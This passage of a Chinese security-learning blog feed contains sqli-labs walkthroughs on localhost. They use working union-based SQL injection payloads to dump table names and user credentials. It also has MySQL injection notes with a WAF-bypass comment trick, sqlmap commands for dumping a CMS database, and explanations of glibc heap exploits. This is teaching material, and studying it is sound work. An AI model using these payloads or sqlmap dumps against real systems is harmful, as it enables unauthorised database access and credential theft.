<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>返回<code>&#39;&#39; LIMIT 0,1&#39;</code>,去掉单引号<code>&#39; LIMIT 0,1</code></p>
<p>猜测SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;id LIMIT 0,1</span><br></pre></td></tr></table></figure>

<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>我们输入<code>?id=1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p>我们再输入<code>?id=1&#39;</code>返回sql错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>返回<code>&#39;&#39;1&#39;&#39;) LIMIT 0,1&#39;</code>,去掉单引号<code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
<p>猜测SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;(&#39;id&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>我们输入?id=1’) –+后发现可以绕过，证明我们猜测是正确的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><p>我们输入<code>?id=1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p>我们再输入<code>?id=1&#39;</code>，<code>?id=1）</code>都没有错误，当我们输入?id=1”发现SQL错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>返回<code>&#39;&quot;1&quot;&quot;) LIMIT 0,1&#39;</code>，去掉单引号<code>&quot;1&quot;&quot;) LIMIT 0,1</code></p>
<p>猜测SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;(&quot;id&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>我们输入?id=1”) –+后发现可以绕过，证明我们猜测是正确的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<h3 id="GET基于报错的SQL注入利用"><a href="#GET基于报错的SQL注入利用" class="headerlink" title="GET基于报错的SQL注入利用"></a>GET基于报错的SQL注入利用</h3><h4 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h4><p>1.利用order by 判断字段数</p>
<p>2.利用 union select 联合查询，获取表名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() --+</span><br></pre></td></tr></table></figure>

<p>3.利用union select 联合查询,获取字段名.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;users() --+</span><br></pre></td></tr></table></figure>

<p>4.利用union select 联合查询，获取字段值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; union select 1,group_concat(username,0x3a,password),3 from users --+</span><br></pre></td></tr></table></figure>

<h4 id="less1-1"><a href="#less1-1" class="headerlink" title="less1"></a>less1</h4><p><code>http://127.0.0.1/sqli/Less-1/?id=1&#39; order by 3 --+</code></p>
<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,2,3 --+</code>这里发现2和3可以注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,user(),database() --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:root@localhost</span><br><span class="line">Your Password:security</span><br></pre></td></tr></table></figure>

<p>换成<code>user()</code>和<code>database()</code>后发现登录用户是<code>root@localhost</code>，数据库是<code>security</code>。</p>
<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,version(),database() --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:5.5.47 version 5.5.47</span><br><span class="line">Your Password:security</span><br></pre></td></tr></table></figure>

<p>我们可以看到数据库版本是5.5.47，默认定义了information_schema数据库。</p>
<p>获取表名：</p>
<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>
<p><code>group_concat(table_name)</code>可以看到表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段名：</p>
<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段值：</p>
<p><code>http://127.0.0.1/sqli/Less-1/?id=0&#39; union select 1,group_concat(username,0x3a,password),3 from users --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<h4 id="less2（整数注入）"><a href="#less2（整数注入）" class="headerlink" title="less2（整数注入）"></a>less2（整数注入）</h4><p>order by 猜测字段数</p>
<p><code>http://127.0.0.1/sqli/Less-2/?id=1%20order%20by%203%20--+</code></p>
<p>发现order by 3 正确 order by 4 不正确</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p>查找注入点</p>
<p><code>http://127.0.0.1/sqli/Less-2/?id=0 union select 1,2,3 --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>查询数据库版本</p>
<p><code>http://127.0.0.1/sqli/Less-2/?id=0 union select 1,version(),3 --+</code></p>
<p>数据库版本：5.5.47</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:5.5.47</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取表名</p>
<p><code>http://127.0.0.1/sqli/Less-2/?id=0 union select 1,group_concat(table_name,3 from information_schema.tables where table_schema=database() --+</code>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段名</p>
<p><code>http://127.0.0.1/sqli/Less-2/?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段值</p>
<p><code>http://127.0.0.1/sqli/Less-2/?id=0 union select 1,group_concat(username,0x3a,password),3 from users --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<h4 id="less3-1"><a href="#less3-1" class="headerlink" title="less3"></a>less3</h4><p><code>http://127.0.0.1/sqli/Less-3/?id=1&#39;) order by 3 --+</code></p>
<p>发现order by 3 正确 order by 4 不正确</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p>查找注入点：</p>
<p><code>http://127.0.0.1/sqli/Less-3/?id=0&#39;)  union select 1,2,3 --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取数据库版本：</p>
<p><code>http://127.0.0.1/sqli/Less-3/?id=0&#39;)  union select 1,version(),3 --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:5.5.47</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取表名：</p>
<p><code>http://127.0.0.1/sqli/Less-3/?id=0&#39;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段名：</p>
<p><code>http://127.0.0.1/sqli/Less-3/?id=0&#39;)  union select 1,group_concat(column_name),3 from information_schema.columns where  table_name=&#39;users&#39; --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段值：</p>
<p><code>http://127.0.0.1/sqli/Less-3/?id=0&#39;)  union select 1,group_concat(username,0x3a,password),3 from users  --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<h4 id="less4-1"><a href="#less4-1" class="headerlink" title="less4"></a>less4</h4><p><code>http://127.0.0.1/sqli/Less-4/?id=1&quot;)  order by 3 --+</code></p>
<p>发现order by 3 正确 order by 4 不正确</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p>获取查找注入点：</p>
<p><code>http://127.0.0.1/sqli/Less-4/?id=0&quot;)  union select 1,2,3 --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取数据库版本：</p>
<p><code>http://127.0.0.1/sqli/Less-4/?id=0&quot;)  union select 1,version(),3 --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:5.5.47</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取表名：</p>
<p><code>http://127.0.0.1/sqli/Less-4/?id=0&quot;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段名：</p>
<p><code>http://127.0.0.1/sqli/Less-4/?id=0&quot;)  union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&#39;users&#39;  --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>获取字段值：</p>
<p><code>http://127.0.0.1/sqli/Less-4/?id=0&quot;)  union select 1,group_concat(username,0x3a,password),3 from users  --+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web学习笔记</category>
      </categories>
      <tags>
        <tag>Sql</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql注入有关知识</title>
    <url>/2020/10/04/Mysql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/10/03/aVpt3MfgbuD4GOT.jpg" alt="5f62d6baa37dd.jpg"></p>
<a id="more"></a>

<h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>在Mysql 5.0以上的版本中，默认定义了information_schema数据库，用来存储数据库元信息，其中具有表schemata(数据库名),tables(表明),columns(列名或字段名)</p>
<p>在schemata表中，schema_name字段用来存储数据库名，</p>
<p>在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p>
<p>在columns表中，table_schema(数据库名),table_name(表名),column_name(字段名)</p>
<h3 id="数据库的增删改查"><a href="#数据库的增删改查" class="headerlink" title="数据库的增删改查"></a>数据库的增删改查</h3><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 列名称 或 * from 表名称 where 字段1&#x3D;&#39;条件1&#39; and 字段2&#x3D;&#39;条件2&#39;</span><br></pre></td></tr></table></figure>

<h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table name(列1,列2 ...) values(值1,值2)</span><br></pre></td></tr></table></figure>

<h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update 表名称 set 列名称&#x3D;新值 where 列名称&#x3D;某值</span><br></pre></td></tr></table></figure>

<h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from 表名称 where 列名称&#x3D;值</span><br></pre></td></tr></table></figure>

<h3 id="Mysql中常用的聚合函数"><a href="#Mysql中常用的聚合函数" class="headerlink" title="Mysql中常用的聚合函数"></a>Mysql中常用的聚合函数</h3><ul>
<li>user()：查看当前Mysql登录用户名</li>
<li>database():查看当前使用Mysql数据库名</li>
<li>version():查看当前Mysql版本</li>
</ul>
<h3 id="limit关键字"><a href="#limit关键字" class="headerlink" title="limit关键字"></a>limit关键字</h3><p>limit m,n  ：从m行开始，到m+n行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">selsct * from admin limit 2,1</span><br></pre></td></tr></table></figure>

<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><h4 id="注释符："><a href="#注释符：" class="headerlink" title="注释符："></a>注释符：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#或--空格或&#x2F;**&#x2F;    #空格可以写成%20%</span><br></pre></td></tr></table></figure>

<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>/*！SQL 语句 */   （只有Mysql可以识别，常用来绕过WAF）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常规：select * from articles where id&#x3D;id</span><br><span class="line">内联注释：select * from articles where id&#x3D; -1 &#x2F;*！union *&#x2F;&#x2F;*！select*&#x2F;1，2，3，4</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web学习笔记</category>
      </categories>
      <tags>
        <tag>Sql</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入原理</title>
    <url>/2020/10/04/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/10/03/lEkMgpX6DKRdSoN.jpg" alt="5f62d6c17793e.jpg"></p>
<a id="more"></a>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入是一种解释性语言，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。</p>
<h3 id="产生条件："><a href="#产生条件：" class="headerlink" title="产生条件："></a>产生条件：</h3><ul>
<li>必须可以进行输入</li>
<li>输入的内容必须要与数据库进行交互</li>
</ul>
<h3 id="CMS逻辑"><a href="#CMS逻辑" class="headerlink" title="CMS逻辑"></a>CMS逻辑</h3><p>index.php首页展示内容，具有文章列表（链接具有文章id），articles.php文章详细页，URL中article.php?id=文章id读取id文章。</p>
<h4 id="SQL注入验证"><a href="#SQL注入验证" class="headerlink" title="SQL注入验证"></a>SQL注入验证</h4><ul>
<li>单引号 ‘</li>
<li>and 1=1</li>
<li>and 1= 2</li>
</ul>
<p>如果页面中Mysql报错，证明该页面存在SQL注入漏洞。</p>
<h3 id="Sqlmap使用"><a href="#Sqlmap使用" class="headerlink" title="Sqlmap使用"></a>Sqlmap使用</h3><p>Sqlmap是检测和利用Sql注入漏洞的工具。</p>
<h4 id="登录注入"><a href="#登录注入" class="headerlink" title="登录注入"></a>登录注入</h4><p>使用Burp Suite截断发送的http报文，然后复制保存为target.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r target.txt -p username --dbs   #username为注入点</span><br></pre></td></tr></table></figure>

<h4 id="CMS注入（URL）"><a href="#CMS注入（URL）" class="headerlink" title="CMS注入（URL）"></a>CMS注入（URL）</h4><h5 id="探测数据库"><a href="#探测数据库" class="headerlink" title="探测数据库"></a>探测数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.1.104:8081&#x2F;cms&#x2F;articles.php?id&#x3D;1&quot; --dbs</span><br></pre></td></tr></table></figure>

<h5 id="指定数据库探测表名"><a href="#指定数据库探测表名" class="headerlink" title="指定数据库探测表名"></a>指定数据库探测表名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.1.104:8081&#x2F;cms&#x2F;articles.php?id&#x3D;1&quot; -D cms --tables</span><br></pre></td></tr></table></figure>

<h5 id="探测字段"><a href="#探测字段" class="headerlink" title="探测字段"></a>探测字段</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.1.104:8081&#x2F;cms&#x2F;articles.php?id&#x3D;1&quot; -D cms --columns</span><br></pre></td></tr></table></figure>

<h5 id="探测当前字段的数据"><a href="#探测当前字段的数据" class="headerlink" title="探测当前字段的数据"></a>探测当前字段的数据</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.1.104:8081&#x2F;cms&#x2F;articles.php?id&#x3D;1&quot; -D cms -T articles -C id,title,content --dump</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web学习笔记</category>
      </categories>
      <tags>
        <tag>Sql</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Lore</title>
    <url>/2020/10/01/House-of-Lore/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/30/W3FUqZ86Y1Hzej4.jpg" alt="5f73fd4f94a60.jpg"></p>
<a id="more"></a>

<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p>
<p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
<p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">   hold one size each, no searching within bins is necessary.</span><br><span class="line">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">   processed to find best fit. But for small ones, fits are exact</span><br><span class="line">   anyway, so we can check now, which is faster.)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">if (in_smallbin_range(nb)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 获取 small bin 的索引</span><br><span class="line">    idx &#x3D; smallbin_index(nb);</span><br><span class="line">    &#x2F;&#x2F; 获取对应 small bin 中的 chunk 指针</span><br><span class="line">    bin &#x3D; bin_at(av, idx);</span><br><span class="line">    &#x2F;&#x2F; 先执行 victim&#x3D; last(bin)，获取 small bin 的最后一个 chunk</span><br><span class="line">    &#x2F;&#x2F; 如果 victim &#x3D; bin ，那说明该 bin 为空。</span><br><span class="line">    &#x2F;&#x2F; 如果不相等，那么会有两种情况</span><br><span class="line">    if ((victim &#x3D; last(bin)) !&#x3D; bin) &#123;</span><br><span class="line">        &#x2F;&#x2F; 第一种情况，small bin 还没有初始化。</span><br><span class="line">        if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;</span><br><span class="line">            &#x2F;&#x2F; 执行初始化，将 fast bins 中的 chunk 进行合并</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        &#x2F;&#x2F; 第二种情况，small bin 中存在空闲的 chunk</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">            bck &#x3D; victim-&gt;bk;</span><br><span class="line">            &#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">            if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">                errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                goto errout;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">            bin-&gt;bk &#x3D; bck;</span><br><span class="line">            bck-&gt;fd &#x3D; bin;</span><br><span class="line">            &#x2F;&#x2F; 如果不是 main_arena，设置对应的标志</span><br><span class="line">            if (av !&#x3D; &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            &#x2F;&#x2F; 细致的检查</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 将申请到的 chunk 转化为对应的 mem 状态</span><br><span class="line">            void *p &#x3D; chunk2mem(victim);</span><br><span class="line">            &#x2F;&#x2F; 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从下面的这部分我们可以看出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">bck &#x3D; victim-&gt;bk;</span><br><span class="line">&#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">    errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">&#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">bin-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; bin;</span><br></pre></td></tr></table></figure>

<p>漏洞点在<code>bck = victim-&gt;bk</code>，如果我们可以控制<code>victim</code>的bk指针，将其修改为伪造好的fake chunk地址。接下来执行<code>bin-&gt;bk = bck</code>和 <code>bck-&gt;fd = bin</code>，就会将fake chunk加入到small bin链表里。接下来只要malloc相应大小的chunk，就可以拿到fake chunk。这里要注意的是<code>bck-&gt;fd != victim</code>，需要进行绕过。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/#_2" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/#_2</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of lore</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Force</title>
    <url>/2020/09/30/House-of-Force/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/rpCue86WmvxHlAX.jpg" alt="5f62d6be6d2fa.jpg"></p>
<a id="more"></a>

<p>关于<code>House of Force</code>的原理，可以看一下CTF WIKI，我这里就不详细讲了，直接上例题。</p>
<h3 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a>HITCON training lab 11</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; &#x2F;&#x2F; [sp+8h] [bp-18h]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@2</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  v3 &#x3D; malloc(0x10uLL);</span><br><span class="line">  *v3 &#x3D; hello_message;</span><br><span class="line">  v3[1] &#x3D; goodbye_message;</span><br><span class="line">  (*v3)(16LL, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    switch ( atoi(&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        show_item();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        add_item();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        change_item();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        remove_item();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        (v3[1])(&amp;buf, &amp;buf);</span><br><span class="line">        exit(0);</span><br><span class="line">        return;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;invaild choice!!!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

